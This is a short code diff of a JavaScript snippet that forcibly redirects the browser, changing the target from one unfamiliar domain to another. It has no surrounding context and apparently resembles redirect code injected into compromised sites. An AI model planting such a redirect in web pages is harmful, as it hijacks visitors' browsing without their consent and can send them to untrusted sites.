@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'https://letsvip.top/';
+    window['location'] = 'https://www.anquananquan.xyz/';
 })();
